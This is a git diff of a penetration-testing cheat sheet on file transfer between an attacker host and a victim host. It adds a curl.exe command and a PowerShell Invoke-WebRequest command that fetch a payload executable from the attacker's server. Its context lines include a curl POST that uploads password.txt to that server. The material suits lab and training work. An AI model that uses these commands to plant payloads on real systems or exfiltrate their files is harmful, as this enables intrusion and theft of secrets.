@@ -50,12 +50,17 @@ python3 -m uploadserver
 ## Linux -> Windows
 3. To pull a file from the attacker host into the victim host from the victim host,
 ```cmd
-curl http://1.1.1.1:8000/payload.txt
-curl http://<server-ip>:8000/payload.txt
+curl.exe http://1.1.1.1:8000/payload.txt
+curl.exe http://<server-ip>:8000/payload.txt
 ```
 - Also note that payload.txt must be in the same directory as the directory you set up your server (ie the directory you run `python3 -m uploadserver`)
+- Note that `curl.exe` may not be available in some windows systems
+4. An alternative will be to use Powershell `Invoke-WebRequest`
+```powershell
+Invoke-WebRequest -Uri "http://<server-ip>:<port>/backupscript.exe" -OutFile "C:\backupscript.exe"
+```
 ## Windows -> Linux
-4. You can also push a file from the victim host to the server (attacker host).
+5. You can also push a file from the victim host to the server (attacker host).
 ```cmd
 curl -X POST http://1.1.1.1:8000/upload -F "files=@./password.txt"
 curl -X POST http:/<server-ip>:8000/upload -F "files=@<path-to-file>"
